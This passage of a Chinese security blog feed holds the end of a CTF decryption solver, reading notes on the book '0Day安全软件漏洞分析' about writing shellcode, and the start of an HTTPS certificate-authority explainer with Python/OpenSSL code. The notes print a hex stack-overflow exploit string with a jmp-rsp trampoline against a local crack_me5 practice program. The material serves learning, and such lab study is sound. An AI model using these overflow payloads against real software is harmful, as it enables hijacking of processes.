class="hljs-type">char</span> Encrypted_data[] = <br>{<br>    <span class="hljs-number">0xE0</span>,<span class="hljs-number">0xF2</span>,<span class="hljs-number">0x23</span>,<span class="hljs-number">0x95</span>,<span class="hljs-number">0x93</span>,<span class="hljs-number">0xC2</span>,<span class="hljs-number">0xD8</span>,<span class="hljs-number">0x8E</span>,<br>    <span class="hljs-number">0x93</span>,<span class="hljs-number">0xC3</span>,<span class="hljs-number">0x68</span>,<span class="hljs-number">0x86</span>,<span class="hljs-number">0xBC</span>,<span class="hljs-number">0x50</span>,<span class="hljs-number">0xF2</span>,<span class="hljs-number">0xDD</span>,<br>    <span class="hljs-number">0x99</span>,<span class="hljs-number">0x44</span>,<span class="hljs-number">0x0E</span>,<span class="hljs-number">0x51</span>,<span class="hljs-number">0x44</span>,<span class="hljs-number">0xBD</span>,<span class="hljs-number">0x60</span>,<span class="hljs-number">0x8C</span>,<br>    <span class="hljs-number">0xF2</span>,<span class="hljs-number">0xAB</span>,<span class="hljs-number">0xDC</span>,<span class="hljs-number">0x34</span>,<span class="hljs-number">0x60</span>,<span class="hljs-number">0xD2</span>,<span class="hljs-number">0x0F</span>,<span class="hljs-number">0xC1</span><br>};<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Encrypt</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> *Data,<span class="hljs-type">uint32_t</span> *Key)</span></span>{<br>    <span class="hljs-type">uint32_t</span> sum = <span class="hljs-number">0x90508D47</span>;<br>    <span class="hljs-type">uint32_t</span> v0 = Data[<span class="hljs-number">0</span>];<br>    <span class="hljs-type">uint32_t</span> v1 = Data[<span class="hljs-number">1</span>];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> j = <span class="hljs-number">0</span> ; j&lt;<span class="hljs-number">4</span> ;j++){<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>;i &lt; <span class="hljs-number">33</span>;i++){<br>            v0 += ((<span class="hljs-number">32</span>*v1)^(v1&gt;&gt;<span class="hljs-number">4</span>) + v1) ^ (sum + Key[sum &amp; <span class="hljs-number">3</span>]) ^ sum;<br>            v1 += ((<span class="hljs-number">32</span>*v0)^(v0&gt;&gt;<span class="hljs-number">4</span>) + v0) ^ (sum + Key[(sum &gt;&gt; <span class="hljs-number">11</span>) &amp; <span class="hljs-number">3</span>]);<br>            sum -= delta;<br>        }<br>    }<br>}<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Decrypt</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> Encrypted_data[<span class="hljs-number">2</span>],<span class="hljs-type">uint32_t</span> Key[<span class="hljs-number">4</span>])</span></span>{<br>    <span class="hljs-type">uint32_t</span> sum = <span class="hljs-number">0x90508D47</span>;<span class="hljs-comment">// - delta*33*4;</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; ++i)<br>    {<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">33</span>; ++j)<br>        {<br>            sum -= delta;<br>        }<br>    }<br>    <span class="hljs-type">uint32_t</span> v0 = Encrypted_data[<span class="hljs-number">0</span>];<br>    <span class="hljs-type">uint32_t</span> v1 = Encrypted_data[<span class="hljs-number">1</span>];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++)<br>    {<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>;i &lt; <span class="hljs-number">33</span>;i++){<br>            sum += delta;<br>            v1 -= (((<span class="hljs-number">32</span>*v0)^(v0&gt;&gt;<span class="hljs-number">4</span>)) + v0) ^ (sum + Key[(sum &gt;&gt; <span class="hljs-number">11</span>) &amp; <span class="hljs-number">3</span>]);<br>            v0 -= (((<span class="hljs-number">32</span>*v1)^(v1&gt;&gt;<span class="hljs-number">4</span>)) + v1) ^ (sum + Key[sum &amp; <span class="hljs-number">3</span>]) ^ sum;<br>        }<br>    }<br>Encrypted_data[<span class="hljs-number">0</span>]=v0;<br>Encrypted_data[<span class="hljs-number">1</span>]=v1;<br>}<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>{<br>    <span class="hljs-type">uint32_t</span> *flag = (<span class="hljs-type">uint32_t</span> *)Encrypted_data;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span> ; i++){<br>        <span class="hljs-built_in">Decrypt</span>(&amp;flag[i*<span class="hljs-number">2</span>],Key);<br>    }<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%s"</span>,flag);<br>}<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>0Day安全软件漏洞分析第2版阅读随笔3</title>
    <link href="/2023/12/12/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%943/"/>
    <url>/2023/12/12/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%943/</url>
    
    <content type="html"><![CDATA[<h1 id="0Day安全软件漏洞分析第2版阅读随笔3"><a href="#0Day安全软件漏洞分析第2版阅读随笔3" class="headerlink" title="0Day安全软件漏洞分析第2版阅读随笔3"></a>0Day安全软件漏洞分析第2版阅读随笔3</h1><p>​开启第三章的阅读，在第二章学习了基本的栈溢出原理之后，我们已经调试过如何在缓冲区植入代码了，那么接下来将继续学习如何更专业地植入代码，或者说开发<code>shellcode</code>😋</p><span id="more"></span><h2 id="第三章-开发shellcode的艺术"><a href="#第三章-开发shellcode的艺术" class="headerlink" title="第三章-开发shellcode的艺术"></a>第三章-开发shellcode的艺术</h2><p>​<code>shellcode</code>这个专用术语来通称缓冲区溢出攻击中植入进程的代码。这 段代码可以是出于恶作剧目的的弹出一个消息框，也可以是出于攻击目的的删改重要文件、窃取 数据、上传木马病毒并运行，甚至是出于破坏目的的格式化硬盘等。请注意本章讨论的<code>shellcode</code>是这种广义上的植入进程的代码，而不是狭义上的仅仅用来获得 <code>shell</code>的代码。</p><p>​我们还会经常看到另一个术语——<code>exploit</code>。 植入代码之前需要做大量的调试工作，例如，弄清楚程序有几个输入点，这些输入将最终 会当作哪个函数的第几个参数读入到内存的哪一个区域，哪一个输入会造成栈溢出，在复制到栈区的时候对这些数据有没有额外的限制等。调试之后还要计算函数返回地址距离缓冲区的偏 移并淹没之，选择指令的地址，最终制作出一个有攻击效果的“承载”着<code>shellcode</code>的输入字符 串。这个代码植入的过程就是漏洞利用，也就是<code>exploit</code>。<code>exploit</code>一般以一段代码的形式出现，用于生成攻击性的网络数据包或者其他形式的攻击性 输入。<code>expliot</code>的核心是淹没返回地址，劫持进程的控制权，之后跳转去执行<code>shellcode</code>。与<code>shellcode</code>具有一定的通用性不同，<code>exploit</code>往往是针对特定漏洞而言的。</p><p>比如我们在第二章里写的代码：</p><img src="/2023/12/12/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%943/Snipaste_2023-12-12_18-40-46.png" class=""><h3 id="开发shellcode需要解决的问题"><a href="#开发shellcode需要解决的问题" class="headerlink" title="开发shellcode需要解决的问题"></a>开发shellcode需要解决的问题</h3><p>​通过上面的介绍，你应该已经明白了什么是<code>shellcode</code>，正是我们在第二章植入的那段机器码。在第二章的植入代码部分，我们是通过手动查找得到函数调用的地址以及函数返回地址，这显然不是通用的。加之，当存在缺陷的函数处于<code>ddl</code>中，并且被程序动态装载，地址每次都存在变化，这时就需要我们找到一种方式，使得能够自动定位到<code>shellcode</code>的地址。</p><h3 id="定位shellcode"><a href="#定位shellcode" class="headerlink" title="定位shellcode"></a>定位shellcode</h3><h4 id="栈帧移位与jmp-esp"><a href="#栈帧移位与jmp-esp" class="headerlink" title="栈帧移位与jmp esp"></a>栈帧移位与jmp esp</h4><p>关于栈帧移位，笔者在这里不太了解实际的过程，暂且记下，现在只关注如何动态定位。</p><img src="/2023/12/12/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%943/Snipaste_2023-12-12_16-27-19.png" class=""><p>​通过前两章的调试，我们其实已经很清楚指令执行和栈变化的过程，可以发现的是，每次函数调用完成之前，都会将之前减去的栈偏移加回来，所以我们可以发现，此时<code>esp</code>(64位下<code>rsp</code>)寄存器的内容正好在我们的返回地址的下一个位置，注意这里指的是栈上返回地址对应的地方，<code>esp</code>是栈帧指针。</p><p>​所以动态定位不就可以实现了，我们在系统找到一个<code>jmp rsp</code>指令的地址，然后在返回地址处填上这个地址，那么之后就会执行这个指令跳转到当前<code>rsp</code>存放的地址，也就是栈上淹没返回地址处后一个位置<code>shellcode</code>就在这之后执行。</p><p>所以重新的规划大概如下图：</p><img src="/2023/12/12/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%943/Snipaste_2023-12-12_18-37-55.png" class=""><h4 id="x64dbg如何搜索跳板指令位置"><a href="#x64dbg如何搜索跳板指令位置" class="headerlink" title="x64dbg如何搜索跳板指令位置"></a>x64dbg如何搜索跳板指令位置</h4><p>笔者之前已经提到，我是在64位机器上进行的操作，所以只能采用x64dbg，没有使用书里的OD，暂时没有找到什么好用的插件可以之间定位到我们需要的<code>dll</code>库中的跳板位置，所以这里我采用原始的搜索方式。</p><p>直接右键搜索命令：<code>jmp rsp</code></p><img src="/2023/12/12/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%943/Snipaste_2023-12-12_18-58-55.png" class=""><img src="/2023/12/12/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%943/Snipaste_2023-12-12_18-59-11.png" class=""><p>这里我就直接采用了第一个地址<code>00007FFC81014A53</code>，在内存布局中找到，确认是系统模块</p><img src="/2023/12/12/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%943/Snipaste_2023-12-12_19-02-55.png" class=""><h4 id="crack-me5"><a href="#crack-me5" class="headerlink" title="crack_me5"></a>crack_me5</h4><p>程序和crack_me4是一样的，只是我们要改变我们的劫持流程。</p><p>首先我们已经获取到了跳板地址，在上面，由于是系统模块，所以一般还是不会变的。然后找到<code>MessageBoxA</code>函数的地址，采用读书笔记2的方法。</p><p>可以发现这次的地址改变了，说明确实是动态加载的，所以这里应该有个疑问<code>MessageBoxA</code>的地址怎么动态获取，笔者在这里还不知道具体的解决方案。查到是<code>00007FFC8361A000</code>，查到ExitProcess函数的地址为<code>00007FFC82DEE3B0</code></p><p>下面制作我们所说的<code>exploit</code>：在之前的基础上加入了退出调用</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">3132333435363738313233343536373831323334353637383132333435363738313233343536373831323334353637383132333435363738534</span>A0181FC7F11114883EC4833DB5348B82165723068737833508BC45350505348B8A06183FC7F11111148C1E01848C1E810FFD04883C44848B8B0E3DE82FC7F111148C1E01048C1E810FFD<span class="hljs-number">04883C448</span><br></code></pre></td></tr></table></figure><img src="/2023/12/12/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%943/Snipaste_2023-12-12_21-56-12.png" class=""><p>然后进行调试过程：</p><p>我们在<code>strcpy</code>函数调用之后那个地方打断点，直接运行到那个地方，这里因为防止截断，我将64位中的0换为了1，然后在此时修改栈上的数据，目前没有找到更好的解决办法</p><img src="/2023/12/12/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%943/Snipaste_2023-12-12_21-46-58.png" class=""><p>已经跳转到了我们的跳板地址</p><img src="/2023/12/12/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%943/Snipaste_2023-12-12_21-50-02.png" class=""><p>这里参考读书笔记2，修改一下在栈上的执行权限，继续步进</p><p>可以发现已经如我们分析的那样，跳转回到了我们布置好的<code>shellcode</code>处</p><img src="/2023/12/12/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%943/Snipaste_2023-12-12_21-52-35.png" class=""><p>正常跳转到弹窗函数：</p><img src="/2023/12/12/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%943/Snipaste_2023-12-12_21-57-18.png" class=""><p>可以发现已经跳到退出函数的地方</p><img src="/2023/12/12/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%943/Snipaste_2023-12-12_22-03-42.png" class=""><p>然后就可以正常退出了，虽然不知道为何不能弹窗。唉</p>]]></content>
    
    
    <categories>
      
      <category>读书笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>读书笔记</tag>
      
      <tag>软件与系统安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTTPS中的数字认证原理</title>
    <link href="/2023/12/09/HTTPS%E4%B8%AD%E7%9A%84%E6%95%B0%E5%AD%97%E8%AE%A4%E8%AF%81%E5%8E%9F%E7%90%86/"/>
    <url>/2023/12/09/HTTPS%E4%B8%AD%E7%9A%84%E6%95%B0%E5%AD%97%E8%AE%A4%E8%AF%81%E5%8E%9F%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h2 id="HTTPS中的数字认证原理"><a href="#HTTPS中的数字认证原理" class="headerlink" title="HTTPS中的数字认证原理"></a>HTTPS中的数字认证原理</h2><p>笔者在近期学习了数字认证技术相关的东西，对其中公钥基础设施PKI进行较为深入的挖掘，于是写下此篇博客。🙈</p><span id="more"></span><h3 id="https与http"><a href="#https与http" class="headerlink" title="https与http"></a>https与http</h3><p>在开始CA相关的东西时，我们首先应该了解https和http。</p><p>HTTP（Hypertext Transfer Protocol）和HTTPS（HTTP Secure）是两种常见的用于在客户端和服务器之间传输数据的协议。<strong>从网络协议的底层来说，两者并无区别，但是https实现了更加安全的传输过程。</strong></p><p>具体有下面的区别：</p><ol><li>默认端口：http是80，https是443</li><li>传输内容：http是明文传输，https是加密传输</li><li>建立连接方式：http是直接连接，https需要SSL/TLS握手过程</li></ol><h3 id="数字认证原理"><a href="#数字认证原理" class="headerlink" title="数字认证原理"></a>数字认证原理</h3><h4 id="公钥基础设施PKI"><a href="#公钥基础设施PKI" class="headerlink" title="公钥基础设施PKI"></a>公钥基础设施PKI</h4><p>举一个简单的例子，一个用户在浏览器里访问网站时，如何才能判别访问的网站是安全可信的呢？</p><p>此时只有引入绝对公正的第三方（一般为政府）作为证明者，证明所访问的网站是可信的，这就是公钥基础设施的由来。</p><p>我们已经知道，https在为客户端和服务端建立连接之前需要进行SSL/TLS握手过程，那么这个过程的实现基础就是PKI。</p><p>那么PKI中，用什么作为信任根或者说信任凭证呢，就是我们常说的证书啦😀</p><p><strong>数字证书是最常见的证书类型，它包含了公钥、实体的身份信息以及证书颁发机构的签名。理所当然的，证书使用的是非对称密码体制。正常情况下，系统会安装CA的根证书用于验证其签发的证书</strong></p><p>目前的浏览器会对用户进行提醒，如果网站的证书过期，会提示有风险。</p><img src="/2023/12/09/HTTPS%E4%B8%AD%E7%9A%84%E6%95%B0%E5%AD%97%E8%AE%A4%E8%AF%81%E5%8E%9F%E7%90%86/Snipaste_2023-12-08_20-35-07.png" class=""><h4 id="证书颁发机构CA-注册机构RA"><a href="#证书颁发机构CA-注册机构RA" class="headerlink" title="证书颁发机构CA&&注册机构RA"></a>证书颁发机构CA&amp;&amp;注册机构RA</h4><p>RA是注册机构（Registration Authority）的缩写。</p><p>在公钥基础设施（PKI）中，注册机构是与证书颁发机构（CA）合作的实体，负责收集、审核和验证实体的身份信息，并向CA提供这些信息以用于数字证书的签发。注册机构在PKI中发挥重要的角色，它们与CA一起确保数字证书的可信性和准确性。注册机构负责收集申请者的身份信息，可能包括个人身份证明、组织文件、域名所有权验证等。注册机构会对这些信息进行审核和验证，确保其真实性和合法性。</p><p>CA是证书颁发机构（Certificate Authority）的缩写。</p><p>证书颁发机构是一个受信任的实体，负责签发和管理数字证书，以验证实体的身份和信息的真实性。在公钥基础设施（PKI）中，<strong>CA是PKI体系结构的核心组成部分之一</strong>。它们使用自己的私钥对数字证书进行签名，并为实体（如网站、个人或设备）颁发包含公钥和身份信息的数字证书。</p><p>CA的主要职责包括：</p><ol><li>身份验证：CA会对申请数字证书的实体进行身份验证，以确保其合法性和真实性。这可以包括验证个人的身份证明、组织的注册文件、域名所有权等，当然也可以通过RA进行代理。</li><li>签发证书：一旦CA验证了申请者的身份信息，它会<strong>使用自己的私钥和根证书对数字证书进行签名</strong>，并将证书发送给申请者。该证书包含了实体的公钥、身份信息以及CA的签名。</li><li>证书管理：CA负责管理已签发的数字证书。这包括证书的更新、吊销和过期处理等操作。CA还维护一个公共的证书撤销列表（CRL），其中包含已吊销的证书的信息。</li><li>可信性建立：由于CA是受信任的实体，其签名可以用于验证数字证书的真实性和完整性。其他实体可以通过验证证书的签名和查看CA的信任列表来确认证书的有效性。</li></ol><h3 id="证书的颁发-验证"><a href="#证书的颁发-验证" class="headerlink" title="证书的颁发&验证"></a>证书的颁发&amp;验证</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>从上文已经知道，证书的颁发和验证是通过CA来完成的，那么下面具体讲一讲实现过程。</p><p>一般来说，在单向认证过程中只需要用户验证服务端证书，只有服务端需要请求CA颁发证书。那么服务端，具体来讲就是一个网站，需要向CA申请一个证书，首先发送证书签发请求，然后通过CA的身份验证合法性后，继续向CA发送一个证书请求文件CSR，CA在接收到证书请求文件后，会使用根证书和私钥对其进行签名，然后就会生成一个证书文件CRT，返回给服务端。</p><p>大概过程如下：</p><img src="/2023/12/09/HTTPS%E4%B8%AD%E7%9A%84%E6%95%B0%E5%AD%97%E8%AE%A4%E8%AF%81%E5%8E%9F%E7%90%86/CA%E9%A2%81%E5%8F%91%E8%BF%87%E7%A8%8B.png" class=""><p>证书的验证是通过系统安装的CA机构的根证书来验证的。</p><p>那么双向认证是基于单向认证的，很好理解，笔者将双向认证的过程也画了一张图😋：</p><img src="/2023/12/09/HTTPS%E4%B8%AD%E7%9A%84%E6%95%B0%E5%AD%97%E8%AE%A4%E8%AF%81%E5%8E%9F%E7%90%86/%E5%8F%8C%E5%90%91%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B.png" class=""><h4 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h4><p>笔者知道，上面的文字叙述过于繁琐，那么下面笔者上代码，这是笔者用Python和OpenSSL库开发的一个的基于双向认证的CA签发模拟程序。</p><p>大概有如下效果：</p><img src="/2023/12/09/HTTPS%E4%B8%AD%E7%9A%84%E6%95%B0%E5%AD%97%E8%AE%A4%E8%AF%81%E5%8E%9F%E7%90%86/Snipaste_2023-12-08_21-11-34.png" class=""><img src="/2023/12/09/HTTPS%E4%B8%AD%E7%9A%84%E6%95%B0%E5%AD%97%E8%AE%A4%E8%AF%81%E5%8E%9F%E7%90%86/Snipaste_2023-12-08_21-12-47.png" class=""><img src="/2023/12/09/HTTPS%E4%B8%AD%E7%9A%84%E6%95%B0%E5%AD%97%E8%AE%A4%E8%AF%81%E5%8E%9F%E7%90%86/Snipaste_2023-12-08_21-12-57.png" class=""><img src="/2023/12/09/HTTPS%E4%B8%AD%E7%9A%84%E6%95%B0%E5%AD%97%E8%AE%A4%E8%AF%81%E5%8E%9F%E7%90%86/Snipaste_2023-12-08_21-13-27.png" class=""><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> concurrent.futures<br><span class="hljs-keyword">from</span> pathlib <span class="hljs-keyword">import</span> Path<br><br>CA_host = <span class="hljs-string">"x.x.x.x"</span><br>CA_port = <span class="hljs-number">54321</span><br>CA_download_port = <span class="hljs-number">12345</span><br>cert_num = <span class="hljs-number">0</span><br><br><span class="hljs-comment"># 根证书生成</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Gen_rootCA</span>():<br>    <span class="hljs-comment"># 生成私钥</span><br>    subprocess.run([<span class="hljs-string">'openssl'</span>, <span class="hljs-string">'genrsa'</span>, <span class="hljs-string">'-des3'</span>, <span class="hljs-string">'-passout'</span>, <span class="hljs-string">'pass:3xsh0re'</span>, <span class="hljs-string">'-out'</span>, <span class="hljs-string">'rootCA.key'</span>, <span class="hljs-string">'2048'</span>])<br>    <span class="hljs-comment"># 指定证书主题字段信息</span><br>    subject_info = <span class="hljs-string">"/C=CN/ST=Beijing/L=Haidian/O=USTB/OU=USTB_CA/CN=USTB.CA"</span><br>    <span class="hljs-comment"># 生成自签名证书</span><br>    subprocess.run(<br>        [<span class="hljs-string">'openssl'</span>, <span class="hljs-string">'req'</span>, <span class="hljs-string">'-new'</span>, <span class="hljs-string">'-x509'</span>, <span class="hljs-string">'-passin'</span>, <span class="hljs-string">'pass:3xsh0re'</span>, <span class="hljs-string">'-key'</span>, <span class="hljs-string">'rootCA.key'</span>, <span class="hljs-string">'-days'</span>, <span class="hljs-string">'365'</span>, <span class="hljs-string">'-out'</span>,<br>         <span class="hljs-string">'rootCA.crt'</span>, <span class="hljs-string">'-subj'</span>, subject_info], capture_output=<span class="hljs-literal">True</span>)<br><br>    <span class="hljs-built_in">print</span>(<span 